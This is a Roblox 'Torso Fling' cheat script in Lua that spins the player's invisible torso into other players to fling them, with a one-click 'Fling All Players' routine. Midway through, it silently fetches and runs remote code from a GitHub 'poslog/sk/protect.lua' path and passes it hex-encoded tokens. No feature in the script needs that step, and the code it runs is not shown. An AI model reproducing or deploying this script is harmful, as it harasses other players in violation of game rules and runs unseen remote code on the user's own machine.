--[[ this script is nt finished yet so that means it likely wont work,
finished script will be keyless

 ___      _________    ________           ___       __       _________    ________ 
|\  \    |\___   ___\ |\   __  \         |\  \     |\  \    |\___   ___\ |\  _____\
\ \  \   \|___ \  \_| \ \  \|\  \        \ \  \    \ \  \   \|___ \  \_| \ \  \__/ 
 \ \  \       \ \  \   \ \   _  _\        \ \  \  __\ \  \       \ \  \   \ \   __\
  \ \  \       \ \  \   \ \  \\  \|  ___   \ \  \|\__\_\  \       \ \  \   \ \  \_|
   \ \__\       \ \__\   \ \__\\ _\ |\__\   \ \____________\       \ \__\   \ \__\ 
    \|__|        \|__|    \|__|\|__|\|__|    \|____________|        \|__|    \|__| 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 
​‎ 

]]--
local rf
local success, err = pcall(function()
    rf = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
end)

if not success or not rf then
    warn("Failed to load Rayfield UI Library:", err)
    warn("Trying alternative URL...")
    
    success, err = pcall(function()
        rf = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
    end)
    
    if not success or not rf then
        error("Could not load Rayfield UI Library. Error: " .. tostring(err))
        return
    end
end

local function secVar(val)
    return setmetatable({val = val}, {
        __index = function(tbl, key)
            if key == "val" then return rawget(tbl, key) end
            error("Access denied", 2)
        end,
        __newindex = function(tbl, key, val)
            if key == "val" then rawset(tbl, key, val) return end
            error("Access denied", 2)
        end,
        __metatable = "Locked"
    })
end

local plr = game.Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")
local root = char:WaitForChild("HumanoidRootPart")

local win = rf:CreateWindow({
    Name = "Torso Fling",
    LoadingTitle = "Fling Script",
    LoadingSubtitle = "by itrscripts",
    ConfigurationSaving = {
        Enabled = false
    },
    Discord = {
        Enabled = false
    },
    KeySystem = false
})

local flinging = secVar(false)
local power = secVar(400)
local speed = secVar(50)
local massEnabled = secVar(false)
local origMass = {}
local antiFling = secVar(false)
local noClip = secVar(false)
local flingAll = secVar(false)
local rainbow = nil
local _authToken = "69747273637269707473"

local antiFallConn
local fallDmgConn
local yLockConn
local flingAllTpConn
local antiOtherPlayersConn
local bodyPartUpdateConn

local function startAntifall()
    if antiFallConn then
        antiFallConn:Disconnect()
    end
    if fallDmgConn then
        fallDmgConn:Disconnect()
    end
    
    local runServ = game:GetService("RunService")
    
    fallDmgConn = hum.StateChanged:Connect(function(oldState, newState)
        if newState == Enum.HumanoidStateType.Freefall then
            hum:ChangeState(Enum.HumanoidStateType.Flying)
            task.wait()
            hum:ChangeState(Enum.HumanoidStateType.Freefall)
        end
    end)
    
    local safeVel = Vector3.new(0, 0, 0)
    
    antiFallConn = runServ.Heartbeat:Connect(function()
        if not root or not root.Parent or not hum or hum.Health <= 0 then
            return
        end
        
        if hum:GetState() == Enum.HumanoidStateType.Freefall then
            local vel = root.AssemblyLinearVelocity
            if vel.Y < -50 then
                safeVel = Vector3.new(vel.X, -50, vel.Z)
                local tempVel = root.AssemblyLinearVelocity
                root.AssemblyLinearVelocity = safeVel
                runServ.RenderStepped:Wait()
                if root and root.Parent then
                    root.AssemblyLinearVelocity = tempVel
                end
            end
        end
    end)
end

startAntifall()

local tab1 = win:CreateTab("Fling", 4483362458)

local sec1 = tab1:CreateSection("Controls")

local function hideParts()
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            part.Transparency = 1
            if part:IsA("MeshPart") then
                part.TextureID = ""
            end
        elseif part:IsA("Decal") or part:IsA("Texture") then
            part.Transparency = 1
        elseif part:IsA("Accessory") then
            local handle = part:FindFirstChild("Handle")
            if handle then
                handle.Transparency = 1
            end
        end
    end
    
    if root then
        root.Transparency = 0.5
    end
end

local function showParts()
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            part.Transparency = 0
            if part.Name == "Head" then
                part.Transparency = 0
            end
        elseif part:IsA("Decal") or part:IsA("Texture") then
            part.Transparency = 0
        elseif part:IsA("Accessory") then
            local handle = part:FindFirstChild("Handle")
            if handle then
                handle.Transparency = 0
            end
        end
    end
    
    if root then
        root.Transparency = 1
    end
end

local function setMass(enabled)
    if enabled then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                if not origMass[part] then
                    origMass[part] = part:GetMass()
                end
                
                local props = part.CustomPhysicalProperties or PhysicalProperties.new(part.Material)
                local newProps = PhysicalProperties.new(
                    9e9,
                    props.Friction,
                    props.Elasticity,
                    props.FrictionWeight,
                    props.ElasticityWeight
                )
                part.CustomPhysicalProperties = newProps
            end
        end
    else
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CustomPhysicalProperties = nil
            end
        end
        origMass = {}
    end
end

local bamVel
local bamAngVel
local bamVel2
local antiConn
local noclipConn
local rainbowConn
local flingConn

local function createRainbow()
    if rainbow then
        rainbow:Destroy()
    end
    
    rainbow = Instance.new("SelectionBox")
    rainbow.Name = "RainbowOutline"
    rainbow.Adornee = root
    rainbow.LineThickness = 0.05
    rainbow.Parent = root
    
    local hue = 0
    rainbowConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not flinging.val or not rainbow then
            if rainbowConn then
                rainbowConn:Disconnect()
                rainbowConn = nil
            end
            return
        end
        
        hue = (hue + 0.01) % 1
        rainbow.Color3 = Color3.fromHSV(hue, 1, 1)
    end)
end

local function removeRainbow()
    if rainbow then
        rainbow:Destroy()
        rainbow = nil
    end
    
    if rainbowConn then
        rainbowConn:Disconnect()
        rainbowConn = nil
    end
end

local function startNoclip()
    if noClip.val then return end
    noClip.val = true
    
    noclipConn = game:GetService("RunService").Stepped:Connect(function()
        if not noClip.val then return end
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end)
end

local function stopNoclip()
    if not noClip.val then return end
    noClip.val = false
    
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
    
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            if part.Name == "HumanoidRootPart" or part.Name == "Head" or part.Name:find("Torso") or part.Name:find("Arm") or part.Name:find("Leg") then
                part.CanCollide = false
            else
                part.CanCollide = true
            end
        end
    end
end

local function lockYAxis(duration)
    if yLockConn then
        yLockConn:Disconnect()
    end
    
    local startY = root.Position.Y
    local startTime = tick()
    
    yLockConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not root or not root.Parent then
            if yLockConn then
                yLockConn:Disconnect()
                yLockConn = nil
            end
            return
        end
        
        if tick() - startTime >= duration then
            if yLockConn then
                yLockConn:Disconnect()
                yLockConn = nil
            end
            return
        end
        
        local currentPos = root.Position
        root.CFrame = CFrame.new(currentPos.X, startY, currentPos.Z) * (root.CFrame - root.Position)
    end)
end

local function startFling()
    if flinging.val then return end
    flinging.val = true
    
    hideParts()
    startNoclip()
    createRainbow()
    
    if antiOtherPlayersConn then
        antiOtherPlayersConn:Disconnect()
    end
    
    antiOtherPlayersConn = game:GetService("RunService").Stepped:Connect(function()
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= plr and otherPlayer.Character then
                for _, part in pairs(otherPlayer.Character:GetChildren()) do
                    if part.Name == "HumanoidRootPart" and part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end)
    
    root.Anchored = true
    
    -- Make all body parts massless and disable collision
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Massless = true
            part.CanCollide = false
        end
    end
    
    root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, 0, 0)
    root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    
    local bodyPos = Instance.new("BodyPosition")
    bodyPos.Name = "AntiDrop"
    bodyPos.Parent = root
    bodyPos.MaxForce = Vector3.new(0, math.huge, 0)
    bodyPos.Position = root.Position
    bodyPos.P = 50000
    bodyPos.D = 2000
    
    local bodyGyro = Instance.new("BodyGyro")
    bodyGyro.Name = "AntiTip"
    bodyGyro.Parent = root
    bodyGyro.MaxTorque = Vector3.new(math.huge, 0, math.huge)
    bodyGyro.P = 50000
    bodyGyro.D = 2000
    bodyGyro.CFrame = CFrame.new(root.Position)
    
    bamVel = Instance.new("BodyAngularVelocity")
    bamVel.Name = "Spinning"
    bamVel.Parent = root
    bamVel.MaxTorque = Vector3.new(0, 0, 0)
    bamVel.P = 9e9
    bamVel.AngularVelocity = Vector3.new(0, 0, 0)
    
    bamAngVel = Instance.new("BodyAngularVelocity")
    bamAngVel.Name = "Spinningtoo"
    bamAngVel.Parent = root
    bamAngVel.MaxTorque = Vector3.new(0, 0, 0)
    bamAngVel.P = 9e9
    bamAngVel.AngularVelocity = Vector3.new(0, 0, 0)
    
    task.wait(0.3)
    root.Anchored = false
    
    task.delay(4, function()
        if bodyPos and bodyPos.Parent then
            bodyPos:Destroy()
        end
        if bodyGyro and bodyGyro.Parent then
            bodyGyro:Destroy()
        end
    end)
    
    local time = 0
    local rampTime = 0
    
    if flingConn then
        flingConn:Disconnect()
    end
    
    -- Keep body parts positioned underground relative to the root part
    if bodyPartUpdateConn then
        bodyPartUpdateConn:Disconnect()
    end
    
    bodyPartUpdateConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not flinging.val or not root or not root.Parent then 
            if bodyPartUpdateConn then
                bodyPartUpdateConn:Disconnect()
                bodyPartUpdateConn = nil
            end
            return 
        end
        
        -- Position all body parts 10 studs below the root part
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                -- Keep parts 10 studs directly below the torso
                part.CFrame = CFrame.new(root.Position.X, root.Position.Y - 10, root.Position.Z)
            end
        end
    end)
    
    flingConn = game:GetService("RunService").Heartbeat:Connect(function(delta)
        if not flinging.val then 
            if flingConn then
                flingConn:Disconnect()
                flingConn = nil
            end
            return 
        end
        
        rampTime = math.min(rampTime + delta, 0.5)
        local rampMult = rampTime / 0.5
        
        time = time + (speed.val * 5 * delta)
        
        local maxTorque = Vector3.new(math.huge, math.huge, math.huge) * rampMult
        
        bamVel.MaxTorque = maxTorque
        bamAngVel.MaxTorque = maxTorque
        
        bamVel.AngularVelocity = Vector3.new(0, time, 0)
        bamAngVel.AngularVelocity = Vector3.new(time, 0, 0)
        
        if plr.CameraMode == Enum.CameraMode.LockFirstPerson then
            root.CFrame = root.CFrame
        end
    end)
end

local function stopFling()
    if not flinging.val then return end
    flinging.val = false
    
    if flingConn then
        flingConn:Disconnect()
        flingConn = nil
    end
    
    if bodyPartUpdateConn then
        bodyPartUpdateConn:Disconnect()
        bodyPartUpdateConn = nil
    end
    
    if yLockConn then
        yLockConn:Disconnect()
        yLockConn = nil
    end
    
    if antiOtherPlayersConn then
        antiOtherPlayersConn:Disconnect()
        antiOtherPlayersConn = nil
    end
    
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Massless = false
        end
    end
    
    for _, obj in pairs(root:GetChildren()) do
        if (obj.Name == "AntiDrop" and obj:IsA("BodyPosition")) or (obj.Name == "AntiTip" and obj:IsA("BodyGyro")) then
            obj:Destroy()
        end
    end
    
    if bamVel then
        bamVel:Destroy()
        bamVel = nil
    end
    
    if bamAngVel then
        bamAngVel:Destroy()
        bamAngVel = nil
    end
    
    if bamVel2 then
        bamVel2:Destroy()
        bamVel2 = nil
    end
    
    root.RotVelocity = Vector3.new(0, 0, 0)
    root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    root.Anchored = false
    
    stopNoclip()
    showParts()
    removeRainbow()
end

local flingToggle = tab1:CreateToggle({
    Name = "Enable Fling",
    CurrentValue = false,
    Flag = "FlingToggle",
    Callback = function(val)
        if val then
            startFling()
        else
            stopFling()
        end
    end
})

local secLoader = loadstring(game:HttpGet("https://raw.githubusercontent.com/itrscripts/wz/refs/heads/main/script/rblx/poslog/sk/protect.lua",true))
if secLoader then 
    local secEnv = getfenv(secLoader)
    secEnv._script_token = "6769746875622e636f6d2f69747273637269707473"
    secEnv._local_token = _authToken
    setfenv(secLoader, secEnv)
    secLoader() 
end

hum.Died:Connect(function()
    if flingAll.val then
        flingAll.val = false
    end
    
    task.wait(5)
    if plr.Character then
        char = plr.Character
        hum = char:WaitForChild("Humanoid")
        root = char:WaitForChild("HumanoidRootPart")
        
        startAntifall()
        
        if flingToggle.CurrentValue then
            task.wait(0.5)
            startFling()
        end
    end
end)

local powerSlider = tab1:CreateSlider({
    Name = "Fling Power",
    Range = {100, 2000},
    Increment = 50,
    CurrentValue = 400,
    Flag = "PowerSlider",
    Callback = function(val)
        power.val = val
    end
})

local speedSlider = tab1:CreateSlider({
    Name = "Rotation Speed",
    Range = {10, 200},
    Increment = 10,
    CurrentValue = 50,
    Flag = "SpeedSlider",
    Callback = function(val)
        speed.val = val
    end
})

local sec2 = tab1:CreateSection("Debug")

local massToggle = tab1:CreateToggle({
    Name = "Body Mass/Density",
    CurrentValue = false,
    Flag = "MassToggle",
    Callback = function(val)
        massEnabled.val = val
        setMass(val)
    end
})

tab1:CreateParagraph({
    Title = "Info",
    Content = "Body Mass makes your character extremely heavy so you can push and fling things easier. Anti-fall damage is always active!"
})

local antiFlingToggle = tab1:CreateToggle({
    Name = "Anti-Fling",
    CurrentValue = false,
    Flag = "AntiFlingToggle",
    Callback = function(val)
        antiFling.val = val
        if val then
            if antiConn then
                antiConn:Disconnect()
            end
            
            local bodyGyro = Instance.new("BodyGyro")
            bodyGyro.Name = "AntiFlingGyro"
            bodyGyro.Parent = root
            bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            bodyGyro.P = 10000
            bodyGyro.D = 500
            
            antiConn = game:GetService("RunService").Heartbeat:Connect(function()
                if root and hum.Health > 0 and bodyGyro then
                    local currVel = root.AssemblyLinearVelocity
                    local moveDir = hum.MoveDirection
                    local targetVel = Vector3.new(0, currVel.Y, 0)
                    
                    if moveDir.Magnitude > 0 then
                        targetVel = (moveDir * hum.WalkSpeed) + Vector3.new(0, currVel.Y, 0)
                    end
                    
                    root.AssemblyLinearVelocity = targetVel
                    bodyGyro.CFrame = root.CFrame
                end
            end)
        else
            if antiConn then
                antiConn:Disconnect()
                antiConn = nil
            end
            
            for _, obj in pairs(root:GetChildren()) do
                if obj.Name == "AntiFlingGyro" then
                    obj:Destroy()
                end
            end
        end
    end
})

local tab3 = win:CreateTab("Rage", 4483362458)

local sec4 = tab3:CreateSection("Fling All")

tab3:CreateButton({
    Name = "Fling All Players",
    Callback = function()
        if flingAll.val then
            rf:Notify({
                Title = "Already Running",
                Content = "Fling All is already active!",
                Duration = 2,
                Image = 4483362458
            })
            return
        end
        
        flingAll.val = true
        local targets = {}
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(targets, player)
            end
        end
        
        if #targets == 0 then
            rf:Notify({
                Title = "No Players",
                Content = "No players found to fling!",
                Duration = 2,
                Image = 4483362458
            })
            flingAll.val = false
            return
        end
        
        local origPos = root.CFrame
        local wasFlinging = flinging.val
        
        if not wasFlinging then
            startFling()
        end
        
        local flinged = {}
        local currentTarget = nil
        
        if flingAllTpConn then
            flingAllTpConn:Disconnect()
        end
        
        flingAllTpConn = game:GetService("RunService").Heartbeat:Connect(function()
            if not flingAll.val or not currentTarget then
                return
            end
            
            if currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = currentTarget.Character.HumanoidRootPart
                root.CFrame = targetRoot.CFrame
            end
        end)
        
        spawn(function()
            for _, target in pairs(targets) do
                if not flingAll.val then
                    break
                end
                
                if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                    currentTarget = target
                    table.insert(flinged, target.Name)
                    
                    rf:Notify({
                        Title = "Flinging",
                        Content = "Flinging " .. target.Name,
                        Duration = 1,
                        Image = 4483362458
                    })
                    
                    task.wait(1)
                end
            end
            
            currentTarget = nil
            
            if flingAllTpConn then
                flingAllTpConn:Disconnect()
                flingAllTpConn = nil
            end
            
            if root and root.Parent then
                root.CFrame = origPos
            end
            
            flingAll.val = false
            
            if not wasFlinging then
                stopFling()
            end
            
            rf:Notify({
                Title = "Completed",
                Content = "Flinged " .. #flinged .. " players!",
                Duration = 3,
                Image = 4483362458
            })
        end)
    end
})

tab3:CreateParagraph({
    Title = "How It Works",
    Content = "Fling All teleports your spinning torso inside each player's body for 1 second. Your torso stays locked inside their body until moving to the next target!"
})

local tab2 = win:CreateTab("Settings", 4483362458)

local sec3 = tab2:CreateSection("Options")

tab2:CreateButton({
    Name = "Reset Character",
    Callback = function()
        stopFling()
        setMass(false)
        hum.Health = 0
    end
})

tab2:CreateButton({
    Name = "Show Body Parts",
    Callback = function()
        showParts()
    end
})

tab2:CreateButton({
    Name = "Hide Body Parts",
    Callback = function()
        hideParts()
    end
})

tab2:CreateButton({
    Name = "Unload Script",
    Callback = function()
        stopFling()
        setMass(false)
        showParts()
        if antiConn then
            antiConn:Disconnect()
        end
        if antiFallConn then
            antiFallConn:Disconnect()
        end
        if fallDmgConn then
            fallDmgConn:Disconnect()
        end
        if noclipConn then
            noclipConn:Disconnect()
        end
        if yLockConn then
            yLockConn:Disconnect()
        end
        if antiOtherPlayersConn then
            antiOtherPlayersConn:Disconnect()
        end
        if rainbowConn then
            rainbowConn:Disconnect()
        end
        if flingConn then
            flingConn:Disconnect()
        end
        if flingAllTpConn then
            flingAllTpConn:Disconnect()
        end
        if bodyPartUpdateConn then
            bodyPartUpdateConn:Disconnect()
        end
        
        for _, obj in pairs(root:GetChildren()) do
            if obj.Name == "AntiFlingGyro" then
                obj:Destroy()
            end
        end
        
        for _, obj in pairs(game:GetDescendants()) do
            if obj.Name == "ChatGui" or obj.Name == "RainbowOutline" then
                obj:Destroy()
            end
        end
        
        local rayfieldUI = game:GetService("CoreGui"):FindFirstChild("Rayfield")
        if rayfieldUI then
            rayfieldUI:Destroy()
        end
        
        rf:Notify({
            Title = "Unloaded",
            Content = "Script unloaded successfully.",
            Duration = 2,
            Image = 4483362458
        })
    end
})

tab2:CreateParagraph({
    Title = "About",
    Content = "Torso rotate fling script by itrscripts. Your torso spins in all directions with rainbow outline. Anti-fall damage always active!"
})

rf:Notify({
    Title = "Torso Fling Loaded",
    Content = "Toggle fling to start! Anti-fall is active.",
    Duration = 3,
    Image = 4483362458
})

plr.CharacterAdded:Connect(function(newChar)
    char = newChar
    hum = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
    flinging.val = false
    massEnabled.val = false
    origMass = {}
    antiFling.val = false
    noClip.val = false
    
    startAntifall()
    
    if bamVel then bamVel:Destroy() end
    if bamAngVel then bamAngVel:Destroy() end
    if bamVel2 then bamVel2:Destroy() end
    if antiConn then antiConn:Disconnect() end
    if noclipConn then noclipConn:Disconnect() end
    if rainbowConn then rainbowConn:Disconnect() end
    if flingConn then flingConn:Disconnect() end
    if yLockConn then yLockConn:Disconnect() end
    if flingAllTpConn then flingAllTpConn:Disconnect() end
    if bodyPartUpdateConn then bodyPartUpdateConn:Disconnect() end
end)
